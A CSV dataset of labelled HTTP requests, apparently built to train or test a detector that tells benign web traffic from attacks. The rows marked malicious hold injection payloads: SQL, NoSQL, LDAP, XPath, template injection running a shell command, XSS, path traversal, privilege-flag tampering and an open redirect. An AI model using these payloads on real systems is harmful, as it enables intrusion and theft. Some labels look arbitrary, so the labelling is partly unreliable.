label,text
malicious,"POST /api/logging HTTP/1.1
Host: cloud-ops.infra-ai.ai
Content-Type: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: application/json
Referer: https://dashboard.cloud-ops.infra-ai.ai
Content-Length: 22
Connection: keep-alive

{""event_details"": ""Success\"", \""lvl\"": 200, \""usr\"": \""admin\"", \""adm\"": true, \""log\"": \""Complete""}"
benign,"POST /user/contact HTTP/1.1
Host: developer-cloud-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 92
Accept-Language: en-US,en;q=0.9
Cache-Control: no-cache
Origin: https://developer-cloud-portal.net
Connection: close

message=Could+you+update+the+API+docs+to+include+examples+where+we+UPDATE+records+based+on+WHERE+clauses%3F"
benign,"GET /products/electronics/tv/details?id=1024&color=black&warranty=extended HTTP/1.1
Host: online-retail-store.biz
Accept: application/json
Referer: https://online-retail-store.biz/products/electronics/tv
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.133 Mobile Safari/537.36
Accept-Encoding: gzip, deflate
Connection: keep-alive
Cookie: sessionid=38af892b7ce14765a3ff"
benign,"HEAD /software/packages/setup_v5.0.1.dmg HTTP/1.1
Host: mac-app-distribution.co
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.198 Safari/537.36
Accept: application/x-diskcopy
Accept-Encoding: gzip, deflate
Connection: close"
benign,"GET /robots.txt HTTP/1.1
Host: data-mining-hub.net
User-Agent: GenericResearchBot/1.0 (+http://researchers-datahub.org/bot)
Accept: text/plain,*/*;q=0.8
Connection: close"
malicious,"POST /api/v2/notes HTTP/1.1
Host: urban-storytellers.zone
Content-Type: application/json
Content-Length: 172
Accept: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36
Cache-Control: max-age=0

{""note_id"":512,""author"":""sophia.m"",""content"":""Remember to verify data sources. Check link: javascript:alert('XSS')""}"
malicious,"POST /api/processJavaObject HTTP/1.1
Host: user-content-management.net
User-Agent: Java/1.8.0_291
Content-Type: application/json
Accept: application/json
Origin: https://user-content-management.net
Content-Length: 306

{
  ""javaData"": ""rO0ABXNyABtvcmdcLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZhbnR1cmVzLkludm9rZXJUcmFuc2Zvcm1lcgoAAAAAAAMAAQAAeHIAD2phdmEubGFuZy5SdW50aW1lAAAAAAABDAAAZXhlY3Q=""
}"
benign,"POST /events/rsvp/submit HTTP/1.1
Host: tech-insights-magazine.ai
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.63 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
Accept-Encoding: gzip, deflate, br
Referer: https://tech-insights-magazine.ai/events

attendance=solo&meal_preference=vegetarian"
benign,"GET /resource/load?file=reports/2023/q2/sales-summary.csv HTTP/1.1
Host: analytics-data-center.net
Accept: text/csv,text/plain,*/*;q=0.8
User-Agent: python-requests/2.31.0
Connection: keep-alive
Accept-Encoding: gzip, deflate
Referer: https://analytics-data-center.net/reports"
benign,"DELETE /api/v3/accounts/5b7a9c0f HTTP/1.1
Host: finance-tools-suite.net
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZnJhbmtsaW4ifQ.UgJk6d8jHui-JqlI9_dj7k2Z5gGxrTIwlJQEgHGWw3Mc
User-Agent: Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.87 Mobile Safari/537.36
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"POST /users/reset-password/request HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/json
Accept: application/json
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36
Content-Length: 48

{""email"":""emma.jordan@my-personal-blog-site.info""}"
malicious,"POST /api/v1/members/search HTTP/1.1
Host: fast-track-courier-services.co
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Content-Type: application/json
Accept: application/json
Accept-Encoding: gzip
Referer: https://fast-track-courier-services.co/admin/search
Connection: close

{""filter"":{""$where"":""this.username==='admin'&&this.password.substr(0,1)==='a'||sleep(2500)""}}"
benign,"GET /robots.txt HTTP/1.1
Host: health-and-wellness-center.us
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:114.0) Gecko/20100101 Firefox/114.0
Accept: text/plain
Accept-Language: en-US,en;q=0.7
Connection: keep-alive"
benign,"GET /forum/posts/view?topic=%4a%5b%6C%7dNewFeatures&sort=latest HTTP/1.1
Host: community.game-dev-forum.org
Accept: application/json
DNT: 1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Accept-Language: en-US,en;q=0.5
Connection: keep-alive"
malicious,"POST /user/search HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: application/json
Content-Type: application/json
Content-Length: 87
Connection: close

{""searchFilter"": ""(&(uid=blogger)(objectClass=person))(|(uid=administrator))""}"
benign,"GET /blog/winter-updates-2024 HTTP/1.1
Host: greenwave-environment.org
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: text/html
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.8
Connection: close"
benign,"GET /members/janedoe/posts HTTP/1.1
Host: urbanconnect.social
Connection: keep-alive
Accept: text/html,application/xhtml+xml
Referer: https://urbanconnect.social/members/janedoe
Cookie: login_token=5a3b1c7ea9f445d48570e8d7db8a21a3; prefs=font_size:medium
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.121 Safari/537.36"
benign,"GET /api/v2/products/electronics/laptops?sort=price_desc&available=true HTTP/1.1
Host: shop-smart-devices.biz
Accept: application/json
DNT: 1
Referer: https://shop-smart-devices.biz/products/electronics
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36
Accept-Encoding: gzip, deflate, br
Connection: keep-alive"
benign,"POST /api/v2/order/submit HTTP/1.1
Host: orders.digital-markets.ai
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Accept: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15
Authorization: Basic bXlhcHA6c2VjdXJlMTIz
Connection: keep-alive
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.7,en;q=0.6
Content-Length: 171

{""orderId"":""ORD123456"",""customer"":{""name"":""Julien Dupont"",""email"":""julien.dupont@digital-markets.ai""},""items"":[{""sku"":""SKU-3245"",""qty"":2},{""sku"":""SKU-7890"",""qty"":1}],""paymentMethod"":""credit_card""}"
benign,"GET /post-sitemap.xml HTTP/1.1
Host: urban-fashion-trends.co
Accept: text/xml, application/xml
Accept-Language: en-GB,en;q=0.8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15
Referer: https://urban-fashion-trends.co/
Connection: keep-alive"
malicious,"POST /api/xpath/query HTTP/1.1
Host: universal-cloud-platform.dev
Content-Type: application/json
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
X-Requested-With: XMLHttpRequest
Origin: https://universal-cloud-platform.dev
Cookie: token=5279b2bc-acb3-4a9a-91af-3175a8abe07c

{""query"": ""/users/user[username='admin' and substring(password,1,1)='p']/details""}"
malicious,"GET /reports/annual HTTP/1.1
Host: finance-data-streams.net
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: */*
Referer: http://finance-data-streams.net/secure/reports{# {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('netstat%20-an').read() }} #}
Cache-Control: no-cache"
benign,"GET /files/access?file=report-final.pdf HTTP/1.1
Host: data-exporter.cloudsolutions.ai
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15
Accept: */*
Accept-Encoding: gzip, deflate, br
DNT: 1
Cache-Control: no-cache
Connection: close"
benign,"POST /user/new HTTP/1.1
Host: digital-drive-network.io
Content-Type: application/x-www-form-urlencoded
Content-Length: 98
Referer: https://digital-drive-network.io/user/new
Origin: https://digital-drive-network.io
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Cookie: ddn_session=vT4b1QyOu7jKnRdfEHplXg
Connection: keep-alive

username=carlos.menarquez&email=carlos.menarquez%40ddn.io&password=DriveOn99&password_confirm=DriveOn99&terms_accepted=true"
benign,"GET /assets/fonts/lato-italic.ttf HTTP/1.1
Host: digitalmarketing-pro.biz
Connection: keep-alive
Accept: application/font-ttf,*/*;q=0.8
Referer: https://digitalmarketing-pro.biz/css/lato.css
Origin: https://digitalmarketing-pro.biz
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1"
benign,"GET /api/openapi.json HTTP/1.1
Host: data-aggregation-platform.ai
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:114.0) Gecko/20100101 Firefox/114.0
Connection: keep-alive
Accept-Encoding: gzip, deflate"
benign,"OPTIONS /services/mail/accounts/2099bf4d HTTP/1.1
Host: mail-hub-enterprise.com
Origin: https://admin.user-portal.emailhost.eu
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: authorization
User-Agent: Mozilla/5.0 (iPad; CPU OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: */*
Cache-Control: max-age=0"
malicious,"POST /api/v3/search/items HTTP/1.1
Host: api.cloud-data-services.ai
Content-Type: application/json
Content-Length: 136
Accept: application/json
User-Agent: Python-urllib/3.8
X-CSRF-Token: c283f6d6-4eae-4a32-8c7e-0f9db1830a3c

{""searchQuery"":""New Winter Coats' oR '1'='1"",""category"":""clothing"",""sort"":""relevance""}"
benign,"GET /resource/load?path=videos/tutorials/python_basics_part3.mp4 HTTP/1.1
Host: edu-video-streaming.tv
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.127 Safari/537.36
Accept: video/mp4,video/*;q=0.9,*/*;q=0.8
Referer: https://edu-video-streaming.tv/tutorials/python_basics
Accept-Language: en-US,en;q=0.9
Cache-Control: max-age=0
Connection: keep-alive"
malicious,"GET /api/download?template=..%c0%ae%c0%af..%c0%ae%c0%af..%c0%ae%c0%afhome%c0%ae%c0%afuser%c0%ae%c0%afsecret HTTP/1.1
Host: data-mining-platform.cloud
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: */*
Accept-Language: en
Cache-Control: no-cache
Connection: close"
benign,"GET /events/%D0%BE%D1%82%D0%BA%D1%80%D1%8B%D1%82%D0%B8%D0%B5 HTTP/1.1
Host: eventhub-virtual.eu
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Connection: keep-alive
User-Agent: curl/7.79.1
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9"
benign,"GET /api/v2/orders/status?token=ZxopLvC9n5wGD83mJBEriyt2qfcF7VKSWMbNLudIZlaYshg1HXkeUPAoTj04Rv6W HTTP/1.1
Host: order-tracking42.biz
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Accept: application/json
Accept-Language: en-GB,en;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: close
X-Requested-With: XMLHttpRequest"
benign,"POST /submit/comment HTTP/1.1
Host: blogcode.dailybytes.io
Content-Type: application/x-www-form-urlencoded
Content-Length: 1348
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.6
Connection: keep-alive
Referer: https://blogcode.dailybytes.io/articles/how-to-write-clean-code

username=ellis.t&email=ellis.t%40dailybytes.io&comment=I+found+this+article+on+writing+clean+code+particularly+insightful.+The+emphasis+on+maintainability+and+clear+naming+conventions+really+resonated+with+me%2C+as+these+are+areas+I+constantly+strive+to+improve+in+my+own+work.+The+examples+provided+helped+clarify+concepts+that+can+be+quite+abstract%2C+and+the+section+on+refactoring+legacy+code+was+especially+practical.+I+intend+to+apply+several+of+these+best+practices+in+our+team%27s+next+project.+Thank+you+for+sharing+such+valuable+information+with+the+community.&postId=5621"
benign,"PUT /api/v3/cart/items/6643 HTTP/1.1
Host: shop.online-retail-store.biz
If-Match: ""1a2b3c4d5e6f""
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1
X-Requested-With: XMLHttpRequest
Content-Length: 42
Connection: keep-alive

{""quantity"":2,""giftWrap"":true,""note"":""Happy Birthday""}"
benign,"GET /api/v1/user/notifications?unread=true HTTP/1.1
Host: cloud-sync-services.ai
User-Agent: curl/7.82.0
Accept: application/json
X-Forwarded-For: 172.31.3.22
Cache-Control: no-cache
Connection: close"
benign,"GET /listings/electronics?sort_by=price_asc&filter[brand]=voltstar&filter[rating]=4plus&page=2 HTTP/1.1
Host: electric-mart.biz
Accept: text/html
Referer: https://electric-mart.biz/listings
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Mobile Safari/537.36
Connection: keep-alive"
benign,"GET /forum/thread/2345?page=2 HTTP/1.1
Host: community.game-dev-forum.org:8888
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept: text/html
Accept-Language: en
Connection: keep-alive
Cache-Control: no-cache"
benign,"POST /api/register HTTP/1.1
Host: digitallearning-hub.net
Content-Type: application/json
Accept: application/json
Origin: https://digitallearning-hub.net
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Content-Length: 156
Connection: close

{""username"":""nathaniel.james"",""email"":""nathaniel.james@digitallearning-hub.net"",""password"":""BrightStar2024"",""fullName"":{""first"":""Nathaniel"",""middle"":""T."",""last"":""James""},""phone"":""+1-415-555-0198""}"
benign,"POST /login HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 93
Accept-Language: en-US,en;q=0.5
Connection: close
Referer: https://community.game-dev-forum.org/login
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.63 Safari/537.36

username=charlie_dev&password=PixelMaster88&callback=%2Fuser%2Fcharlie_dev%2Fprofile%2Foverview"
benign,"PATCH /v1/api/bookings/ab-8391-xy HTTP/1.1
Host: secure-user-portal.net
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.bXl0b2tlbg
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Accept: application/json
Connection: keep-alive
Content-Length: 47

{""cancellation_reason"":""schedule_conflict"",""status"":""cancelled""}"
malicious,"PATCH /api/account/update HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Content-Type: application/json
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.9
X-CSRF-Token: 9f8d7a6b4c3e2f1a0b9d8c7e6f5a4b3c
Content-Length: 112

{
  ""username"": ""jessica.martin"",
  ""email"": ""jessica.martin@secure-user-portal.net"",
  ""Is_Admin"": true,
  ""plan_id"": ""premium""
}"
malicious,"GET /user/validate?email_address=contact@secure-user-portal.net HTTP/1.1
Host: secure-user-portal.net
User-Agent: Wget/1.20.3 (linux-gnu)
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close"
malicious,"POST /api/user/update HTTP/1.1
Host: social-connect-network.org
User-Agent: Wget/1.21.1 (linux-gnu)
Content-Type: application/x-www-form-urlencoded
Accept: */*
Referer: https://social-connect-network.org/profile/edit
Cookie: scn_session=abcdef1234567890
Content-Length: 58

status=active&user_data=profile_pic%27%5D%7D%2C%7B%24unset%3A%7Badmin%3A1%7D%7D%2F%2F"
benign,"GET /settings/permissions?filter[type]=admin&filter[active]=true HTTP/1.1
Host: secure-user-portal.net
Cache-Control: no-cache
Pragma: no-cache
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Accept-Language: en-GB,en;q=0.9
Referer: https://secure-user-portal.net/home"
malicious,"POST /api/redirect HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: application/json, text/html, */*
Content-Type: application/json
Origin: https://online-retail-store.biz
Content-Length: 58

{""continue_to"": ""https://ads.attacker-net.info/promo""}"
malicious,"PUT /api/v1/config/update HTTP/1.1
Host: internal-config-server.intranet.local
User-Agent: Wget/1.21.1 (linux-gnu)
Content-Type: application/json
Accept: application/json
Content-Length: 75

{""featureFlags"":{""newUI"":true,""betaAccess"":""enabled""},""user"":""adminUser42""}"
benign,"POST /user/profile/update HTTP/1.1
Host: connect-safe-hub.org
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary2Xmf38JplREa5Ykl
Content-Length: 256
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Connection: keep-alive

------WebKitFormBoundary2Xmf38JplREa5Ykl
Content-Disposition: form-data; name=""first_name""

Elena
------WebKitFormBoundary2Xmf38JplREa5Ykl
Content-Disposition: form-data; name=""last_name""

Martinez
------WebKitFormBoundary2Xmf38JplREa5Ykl
Content-Disposition: form-data; name=""bio""

Enjoys hiking and outdoor photography.
------WebKitFormBoundary2Xmf38JplREa5Ykl--"
benign,"HEAD /index.html HTTP/1.1
Host: events-management-hub.io
Accept: */*
Accept-Encoding: gzip, deflate, br
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
Referer: https://events-management-hub.io/login
Connection: close"
benign,"GET /forum/thread/58924/user-experience-tips HTTP/1.1
Host: nextgen-ui-community.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:116.0) Gecko/20100101 Firefox/116.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Referer: https://source-code-exchange.dev/projects/open-source-uicomp
Cache-Control: max-age=0
Connection: keep-alive"
